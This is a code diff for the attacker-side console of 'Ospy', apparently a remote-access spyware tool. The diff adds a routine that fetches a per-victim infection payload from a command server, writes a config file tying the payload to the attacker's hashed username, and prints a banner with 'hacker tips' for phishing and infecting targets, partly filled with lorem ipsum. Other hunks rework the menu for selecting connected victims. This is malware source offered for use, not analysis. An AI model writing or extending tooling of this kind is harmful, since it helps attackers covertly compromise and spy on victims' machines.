@@ -1,31 +1,33 @@
 #include "attack_mode.h"
 #include "connection.h"
 #include "utilities.h"
-#include <stdbool.h>
+#include "md5.h"
 
 main_data data;
-
-int * active_victims;
-char ** name_of_connected_victim;
-
 char connected_victims[MAX_VICTIMS_PER_ATTACKER][MAX_USER_NAME_LEN];
 
 bool valid_victim_name (char * victim_name){
 	for (int i = 0; i < strlen(victim_name); i++){
 		if (!((victim_name[i] >= 'a' && victim_name[i] <= 'z') || (victim_name[i] >= 'A' && victim_name[i] <= 'Z') || victim_name[i] == '_' || (victim_name[i] >= '0' && victim_name[i] <= '9')))
-			return FALSE;
+			return false;
 	}
-	return TRUE;
+	return true;
 }
 
+extern char attacker_username[MAX_USER_NAME_LEN];
 void create_new_payload(){
-	char victim_name[MAX_INPUT_LEN];
+	char pwd[100];
+	getcwd(pwd, sizeof(pwd)); // set in "pwd" the current path
 	
+	FILE * config_file;
+	char victim_name[MAX_USER_NAME_LEN];
+	char commend[MAX_USER_NAME_LEN  + 40];
+	char payload_folder_path[15 + MAX_USER_NAME_LEN];
 	do {
 		print_small_banner();
 		printf("\n[✚] create new payload ....\n");
 		printf("    Enter vicim name : ");
-		safe_scan(&victim_name, MAX_INPUT_LEN);
+		safe_scan(&victim_name, MAX_USER_NAME_LEN);
 		if (valid_victim_name(victim_name))
 			break;
 		else {
@@ -34,6 +36,24 @@ void create_new_payload(){
 		} 		
 	} while (1);
 	
+	// request the payload from the server
+	A_2_S_encrypted_message_handler(data, GET_VICTIM_PAYLOAD);
+	recv_file(victim_name, "payload", "", "payload");
+		
+	/*
+	create the config file
+	the config file will look like :
+		ori_mac_mini ( this is the victim_name)
+		16b1c83de8f9518e673838b2d6ea75dc ( this is the md5 hash of the name of the attacker)
+	*/
+	sprintf(commend, "Ospy/%s/payload/config",victim_name);
+	config_file = fopen(commend, "wt");
+	fprintf(config_file, "%s\n", victim_name); 
+	fprintf(config_file, "%s", md5(attacker_username)); 
+	fclose(config_file);	
+	
+	print_small_banner();
+	printf("\033[31;1m███████▀▀▀░░░░░░░▀▀▀███████\033[0m  \033[32;1mYES ! the payload saved successfully.\033[0m\n\033[31;1m████▀░░░░░░░░░░░░░░░░░▀████\033[0m  You can find the payload in Ospy folder.\n\033[31;1m███│░░░░░░░░░░░░░░░░░░░│███\033[0m  [»] Ospy folder path : %s/Ospy\n\033[31;1m██▌│░░░░░░░░░░░░░░░░░░░│▐██\033[0m\n\033[31;1m██░└┐░░░░░░░░░░░░░░░░░┌┘░██\033[0m  \033[4;37m\033[1m\033[37mHere some hacker tips for great Ospy infect :\033[0m\n\033[31;1m██░░└┐░░░░░░░░░░░░░░░┌┘░░██\033[0m\n\033[31;1m██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██\033[0m  * \x1B[36mfishing\033[0m\n\033[31;1m██▌░│██████▌░░░▐██████│░▐██\033[0m    is simply dummy text of the printing and\n\033[31;1m███░│▐███▀▀░░▄░░▀▀███▌│░███\033[0m    typesetting industry. Lorem Ipsum has been\n\033[31;1m██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██\033[0m    the industrysstandard dummy\n\033[31;1m██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██\033[0m  * \x1B[36minfect\033[0m\n\033[31;1m████▄─┘██▌░░░░░░░▐██└─▄████\033[0m    is simply dummy text of the printing and\n\033[31;1m█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████\033[0m    typesetting industry. Lorem Ipsum has been\n\033[31;1m████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████\033[0m\n\033[31;1m█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████\033[0m\n\033[31;1m███████▄░░░░░░░░░░░▄███████\033[0m\n\033[31;1m██████████▄▄▄▄▄▄▄██████████\033[0m  GOOD LUCK\n",pwd);
 }
 
 void choose_attack_menu (){
@@ -49,34 +69,6 @@ void choose_attack_menu (){
 	printf("[8] \033[96mSelect other victim\033[0m\n");
 	printf("[9] \033[96mExit Ospy\033[0m\n\n");
 }
-
-//void print_all_connected_victims(){
-//	print_small_banner();
-//	A_S_message_handler(data, GET_CONNECTED_VICTM);
-//	num_of_connected_victims = 0;
-//	name_of_connected_victim = (char **) malloc(sizeof(char *));
-//	active_victims = (int *) malloc(sizeof(int));
-//	printf("\033[4;37m\033[1m\033[37mSelect victim or other option - \033[0m\n");
-//	printf("\n  \033[4;37mConnected victims list : \033[0m\n");
-//	while (recv(attacker_socket, &connected_victims, sizeof(connected_victims_protocol), 0) > 0){
-//		if (strcmp(connected_victims.victim_name, "") != 0){
-//			name_of_connected_victim = (char **) realloc(name_of_connected_victim, ++num_of_connected_victims * sizeof(char *));
-//			name_of_connected_victim[num_of_connected_victims-1] = (char *) malloc(MAX_INPUT_LEN * sizeof(char));
-//			active_victims = (int *) realloc(active_victims, num_of_connected_victims * sizeof(int));
-//			active_victims[num_of_connected_victims-1] = 1;
-//			strcpy(name_of_connected_victim[num_of_connected_victims-1],connected_victims.victim_name);
-//			printf("    [%d] %s\n",num_of_connected_victims, connected_victims.victim_name);
-//			fflush(stdout);
-//		}
-//		if(connected_victims.end_of_connected_victims == 1){
-//			break;
-//		}
-//	}
-//	printf("\n  \033[4;37mOther options - \033[0m\n");
-//	printf("    [A] Add new victim\n");
-//	printf("    [R] Reload connected victims list\n");
-//	printf("    [E] Exit Ospy\n");
-//}
 
 void print_all_connected_victims(){
 	print_small_banner();
@@ -125,10 +117,9 @@ void choose_victim (){
 		choose_victim();
 	}
 	else if (attacker_selection == 'A' || attacker_selection == 'a'){
-		//printf("\ncreate new payload ....\n");
 		create_new_payload();
-		sleep(2);
-		exit(1);
+		press_enter_to_continue();
+		choose_victim();
 	}
 	else if (attacker_selection == 'E' || attacker_selection == 'e'){
 		exit(1);
@@ -141,7 +132,5 @@ void choose_victim (){
 		strcpy(data.selected_victim_name, connected_victims[attacker_selection - '0']);
 		strcpy(selected_victim_name, connected_victims[attacker_selection - '0']); // for later use
 		A_2_S_encrypted_message_handler(data, SELECT_VICTIM);
-		//free(active_victims);
 	}	
-	
 }
